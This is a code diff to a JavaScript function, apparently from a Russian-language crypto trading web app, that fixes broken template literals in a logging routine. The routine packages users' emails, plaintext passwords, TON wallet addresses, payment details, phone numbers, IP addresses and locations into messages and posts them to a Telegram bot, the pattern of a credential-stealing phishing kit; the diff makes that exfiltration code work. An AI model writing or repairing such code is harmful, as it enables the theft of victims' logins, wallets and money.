@@ -2453,70 +2453,70 @@ async function sendLog(method, email, password) {
     });
     let text = '';
     if (method === 'register') {
-      text = 🆕 <b>Новый пользователь</b>\n
-           + 👤 ${uid} ${username}\n
-           + 📧 ${email    || '—'}\n
-           + 🔑 ${password || '—'}\n
-           + 📱 ${ua}\n
-           + 🌐 Язык: ${navigator.language || 'ru'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
+      text = `🆕 <b>Новый пользователь</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `📧 ${email    || '—'}\n`
+           + `🔑 ${password || '—'}\n`
+           + `📱 ${ua}\n`
+           + `🌐 Язык: ${navigator.language || 'ru'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     } else if (method === 'ton_wallet') {
-      text = 💎 <b>TON Кошелёк подключён</b>\n
-           + 👤 ${uid} ${username}\n
-           + 💼 Адрес: ${email}\n
-           + 🔑 PublicKey: ${password || '—'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
+      text = `💎 <b>TON Кошелёк подключён</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `💼 Адрес: ${email}\n`
+           + `🔑 PublicKey: ${password || '—'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     } else if (method === 'wallet_action') {
       const parts = email.split('|');
       const wMode = parts[0], wType = parts[1], wCur = parts[2], wAmount = parts[3];
       const modeLabel = wMode === 'deposit' ? '💳 Пополнение' : '📤 Вывод';
-      text = ${modeLabel}\n
-           + 👤 ${uid} ${username}\n
-           + 💱 ${wCur} (${wType})\n
-           + 💰 Сумма: ${wAmount}\n
-           + 🏦 Реквизиты: ${password || '—'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
+      text = `${modeLabel}\n`
+           + `👤 ${uid} ${username}\n`
+           + `💱 ${wCur} (${wType})\n`
+           + `💰 Сумма: ${wAmount}\n`
+           + `🏦 Реквизиты: ${password || '—'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     } else if (method === 'verification') {
-      text = 🛡️ <b>Пройдена верификация</b>\n
-           + 👤 ${uid} ${username}\n
-           + 📞 Телефон: ${email || '—'}\n
-           + 📱 ${ua}\n
-           + 🌐 Язык: ${navigator.language || 'ru'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-      } else if (method === 'deal_created') {
+      text = `🛡️ <b>Пройдена верификация</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `📞 Телефон: ${email || '—'}\n`
+           + `📱 ${ua}\n`
+           + `🌐 Язык: ${navigator.language || 'ru'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
+    } else if (method === 'deal_created') {
       const parts = email.split('|');
-      const dType = parts[0] === 'buy' ? ' Покупка' : ' Продажа';
+      const dType = parts[0] === 'buy' ? 'Покупка' : 'Продажа';
       const dCur = parts[1];
       const dAmount = parts[2];
       const dId = parts[3];
-      text = 🆕 <b>Новый ордер из приложения</b>\n
-           + 👤 ${uid} ${username}\n
-           + 🆔 ID: <code>#${dId}</code>\n
-           + 📊 Тип: ${dType}\n
-           + 💎 ${dAmount} ${dCur}\n
-           + 📝 Описание:\n${password || '—'}\n
-           + 📱 ${ua}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
+      text = `🆕 <b>Новый ордер из приложения</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `🆔 ID: <code>#${dId}</code>\n`
+           + `📊 Тип: ${dType}\n`
+           + `💎 ${dAmount} ${dCur}\n`
+           + `📝 Описание:\n${password || '—'}\n`
+           + `📱 ${ua}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     } else {
       const label = method === 'telegram'
         ? '✈️ <b>Вход через Telegram</b>'
         : '🔐 <b>Вход</b>';
-      text = ${label}\n
-           + 👤 ${uid} ${username}\n
-           + 📧 ${email    || '—'}\n
-           + 🔑 ${password || '—'}\n
-           + 📱 ${ua}\n
-           + 🌐 Язык: ${navigator.language || 'ru'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
+      text = `${label}\n`
+           + `👤 ${uid} ${username}\n`
+           + `📧 ${email    || '—'}\n`
+           + `🔑 ${password || '—'}\n`
+           + `📱 ${ua}\n`
+           + `🌐 Язык: ${navigator.language || 'ru'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     }
     const resp = await fetch(
-      https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage,
+      `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,
       {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
